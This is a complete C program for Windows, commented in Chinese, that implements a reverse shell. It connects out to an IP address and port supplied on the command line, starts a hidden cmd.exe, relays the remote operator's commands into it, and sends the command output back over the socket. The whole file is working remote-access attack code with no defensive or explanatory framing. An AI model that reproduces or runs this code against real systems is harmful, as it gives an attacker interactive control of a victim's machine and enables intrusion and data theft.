#include <winsock2.h>             // Windows Socket 编程头文件
#include <windows.h>              // Windows API 头文件
#include <stdio.h>                // 标准输入输出
#include <string.h>               // 字符串处理函数
#include "gbk.h"                  // 自定义 gbk 转 utf-8 的头文件（需你自己实现）

#pragma comment(lib, "ws2_32.lib") // 链接 ws2_32.lib，Socket 所需库

HANDLE hReadOut, hWriteIn;        // 管道句柄：读取子进程输出、写入子进程输入
SOCKET sock = INVALID_SOCKET;     // 定义全局 Socket 变量

								  // 读取子进程（cmd）的输出，并通过 socket 发给远端
DWORD WINAPI ReadOutputThread(LPVOID param) {
	char buffer[1024];
	DWORD bytesRead;
	while (1) {
		// 从子进程 stdout 管道中读取输出内容
		BOOL success = ReadFile(hReadOut, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
		if (!success || bytesRead == 0) break; // 读取失败或结束则退出循环
		buffer[bytesRead] = '\0'; // 添加 null 终止符，防止乱码

								  // 尝试将 GBK 编码转为 UTF-8 发送（避免乱码）
		char* utf8_buf = gbk_to_utf8(buffer);
		if (utf8_buf) {
			send(sock, utf8_buf, (int)strlen(utf8_buf), 0); // 发送转码后的内容
			free(utf8_buf); // 释放内存
		}
		else {
			send(sock, buffer, bytesRead, 0); // 发送原始数据
		}
	}
	return 0;
}

// 读取 socket 中的数据并写入子进程（cmd）的输入管道
DWORD WINAPI SocketReadThread(LPVOID param) {
	char buffer[512];
	int ret;
	while (1) {
		ret = recv(sock, buffer, sizeof(buffer), 0); // 从远端接收命令
		if (ret <= 0) break; // 接收失败或连接关闭
		DWORD bytesWritten;
		WriteFile(hWriteIn, buffer, ret, &bytesWritten, NULL); // 写入 cmd 的 stdin
	}
	return 0;
}

int main(int argc, char *argv[]) {
	// 检查参数个数是否为 2（IP 和端口）
	if (argc != 3) {
		printf("Usage: %s <IP> <PORT>\n", argv[0]);
		return 1;
	}

	const char *ip = argv[1];
	int port = atoi(argv[2]); // 字符串端口转 int
	if (port <= 0 || port > 65535) {
		printf("Invalid port number: %s\n", argv[2]);
		return 1;
	}

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData); // 初始化 WinSock

										  // 创建 TCP socket
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		printf("Socket error\n");
		return 1;
	}

	// 设置目标地址结构体
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(port); // 设置端口（主机字节序转网络字节序）
	server.sin_addr.s_addr = inet_addr(ip); // 设置 IP 地址

											// 尝试连接远程服务器
	if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
		printf("Connect failed\n");
		closesocket(sock);
		return 1;
	}

	// 配置管道属性，允许继承句柄
	SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
	HANDLE hWriteOut, hReadIn;
	STARTUPINFOA si = { sizeof(si) }; // 创建进程所需结构体
	PROCESS_INFORMATION pi; // 存储新创建进程的信息

							// 创建 stdout 管道（cmd 输出 -> 程序读取）
	CreatePipe(&hReadOut, &hWriteOut, &sa, 0);
	SetHandleInformation(hReadOut, HANDLE_FLAG_INHERIT, 0); // 禁止继承读取端

															// 创建 stdin 管道（程序写入 -> cmd 输入）
	CreatePipe(&hReadIn, &hWriteIn, &sa, 0);
	SetHandleInformation(hWriteIn, HANDLE_FLAG_INHERIT, 0); // 禁止继承写入端

															// 设置 cmd 的标准输入输出指向管道
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdOutput = hWriteOut;
	si.hStdError = hWriteOut;
	si.hStdInput = hReadIn;

	// 启动 cmd.exe（/Q 静默模式），将其输入输出重定向
	if (!CreateProcessA(NULL, "cmd.exe /Q", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		printf("CreateProcess failed: %lu\n", GetLastError());
		closesocket(sock);
		return 1;
	}

	// 父进程关闭不需要的句柄
	CloseHandle(hWriteOut);
	CloseHandle(hReadIn);

	// 创建线程：读取 cmd 输出、读取 socket 数据
	HANDLE hThreadOut = CreateThread(NULL, 0, ReadOutputThread, NULL, 0, NULL);
	HANDLE hThreadIn = CreateThread(NULL, 0, SocketReadThread, NULL, 0, NULL);

	// 等待子进程（cmd）退出
	WaitForSingleObject(pi.hProcess, INFINITE);

	// 清理所有资源
	CloseHandle(hThreadOut);
	CloseHandle(hThreadIn);
	CloseHandle(hWriteIn);
	CloseHandle(hReadOut);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	closesocket(sock);
	WSACleanup(); // 清理 WinSock
	return 0;
}
